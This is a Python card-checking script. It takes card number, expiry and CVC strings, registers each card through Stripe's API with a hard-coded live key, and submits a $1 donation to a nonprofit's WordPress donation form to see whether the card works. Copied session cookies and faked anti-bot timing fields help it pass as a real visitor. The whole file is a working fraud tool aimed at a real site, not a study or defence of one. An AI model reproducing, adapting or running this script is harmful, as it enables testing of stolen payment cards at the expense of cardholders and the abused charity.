import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random1 = random.randint(1, 4)
	random2 = random.randint(1, 99)
	
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F6f0a6c63d0%3B+stripe-js-v3%2F6f0a6c63d0%3B+card-element&referrer=https%3A%2F%2Ffiscallab.org&time_on_page=64719&client_attribution_metadata[client_session_id]=b7406f90-d09b-4b25-ab97-1a5787552a79&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51SrOZTRoDUPZzfT6CJxfl5nxRiLMkij7wCwLamOQWsDbdZQTXcvOWTNEm5RbtIWonriZrGGgtUQFsL4zvMrDrlrx00GxhbzTqF'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
	    '__cf_bm': 'L7pHP.SScQzx6wZr10uZ4k93UyzRELZvEYh_2yt_640-1773919116-1.0.1.1-pG9dGoPBKda5Qcdk.X4LB7L62p2dpp1A0lY.Lp5fW7fUVv9CVIkZ0bJzjSTCnnz7TUgxqY3BbQwwM4nNWA7YxnGooEfGL8zkHwK6aF0ABn8',
	    'cebs': '1',
	    '_ce.clock_data': '-608%2C92.63.180.202%2C2%2Cebf1ad94f36d69f16f9f152425971244%2CChrome%2CTH',
	    'cebsp_': '1',
	    '_ce.s': 'v~35e7bd8b06b6d06e1a1e8acb9e22a7be01c7b604~lcw~1773919119711~vir~new~lva~1773919118926~vpv~0~v11.cs~466926~v11.s~6165a570-2385-11f1-8e98-0f8154f673c3~v11.vs~35e7bd8b06b6d06e1a1e8acb9e22a7be01c7b604~v11.fsvd~eyJ1cmwiOiJmaXNjYWxsYWIub3JnL2RvbmF0ZSIsInJlZiI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwidXRtIjpbXX0%3D~v11.sla~1773919119700~v11.ss~1773919119710~v11ls~6165a570-2385-11f1-8e98-0f8154f673c3~lcw~1773919119721',
	    '__stripe_mid': 'e098248e-676a-490d-8c84-61827f178f0079fb13',
	    '__stripe_sid': '4c5a5147-1c72-49ba-8e53-26d4cd5b82ef58301b',
	}
	
	headers = {
	    'authority': 'fiscallab.org',
	    'accept': '*/*',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__cf_bm=L7pHP.SScQzx6wZr10uZ4k93UyzRELZvEYh_2yt_640-1773919116-1.0.1.1-pG9dGoPBKda5Qcdk.X4LB7L62p2dpp1A0lY.Lp5fW7fUVv9CVIkZ0bJzjSTCnnz7TUgxqY3BbQwwM4nNWA7YxnGooEfGL8zkHwK6aF0ABn8; cebs=1; _ce.clock_data=-608%2C92.63.180.202%2C2%2Cebf1ad94f36d69f16f9f152425971244%2CChrome%2CTH; cebsp_=1; _ce.s=v~35e7bd8b06b6d06e1a1e8acb9e22a7be01c7b604~lcw~1773919119711~vir~new~lva~1773919118926~vpv~0~v11.cs~466926~v11.s~6165a570-2385-11f1-8e98-0f8154f673c3~v11.vs~35e7bd8b06b6d06e1a1e8acb9e22a7be01c7b604~v11.fsvd~eyJ1cmwiOiJmaXNjYWxsYWIub3JnL2RvbmF0ZSIsInJlZiI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwidXRtIjpbXX0%3D~v11.sla~1773919119700~v11.ss~1773919119710~v11ls~6165a570-2385-11f1-8e98-0f8154f673c3~lcw~1773919119721; __stripe_mid=e098248e-676a-490d-8c84-61827f178f0079fb13; __stripe_sid=4c5a5147-1c72-49ba-8e53-26d4cd5b82ef58301b',
	    'origin': 'https://fiscallab.org',
	    'referer': 'https://fiscallab.org/donate/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1773919183364',
	}
	
	data = {
	    'data': f'ak_hp_textarea=&ak_js=1773919117855&__fluent_form_embded_post_id=1738&_fluentform_3_fluentformnonce=45daf2dbf3&_wp_http_referer=%2Fdonate%2F&names%5Bfirst_name%5D=Gen&names%5Blast_name%5D=Paypal&email=genpaypal01%40gmail.com&input_radio=One-Time&payment_input=Other&custom-payment-amount=1&payment_method=stripe&ak_bib=1773919126917&ak_bfs=1773919182646&ak_bkpc=24&ak_bkp=10%3B3%3B4%2C206%3B4%2C119%3B9%2C146%3B1%2C281%3B3%2C0%3B2%2C716%3B4%2C312%3B8%2C164%3B4%2C101%3B3%3B5%2C121%3B7%2C111%3B8%2C219%3B8%2C217%3B2%3B9%2C349%3B8%2C43%3B9%2C44%3B9%2C43%3B2%2C565%3B3%2C8%3B2%3B&ak_bmc=2%3B2%2C3072%3B7%2C1758%3B19%2C1398%3B7%2C3790%3B11%2C5284%3B27%2C3401%3B12%2C2170%3B4%2C40471%3B&ak_bmcc=9&ak_bmk=&ak_bck=20%3B20%3B20%3B20%3B20%3B20%3B20%3B20%3B20%3B20%3B20%3B20%3B20&ak_bmmc=1&ak_btmc=6&ak_bsc=9&ak_bte=125%3B199%2C160%3B74%2C393%3B122%2C1234%3B278%2C245%3B111%2C433%3B199%2C145%3B1%2C306%3B90%2C1668%3B72%2C1336%3B107%2C2170%3B233%2C167%3B123%2C344%3B241%2C176%3B66%2C183%3B77%2C5214%3B297%2C1962%3B72%2C1079%3B39%2C2161%3B90%2C28448%3B258%2C201%3B81%2C11403%3B&ak_btec=22&ak_bmm=42%2C309%3B&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '3',
	}
	
	response = requests.post('https://fiscallab.org/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
	
	return response.text
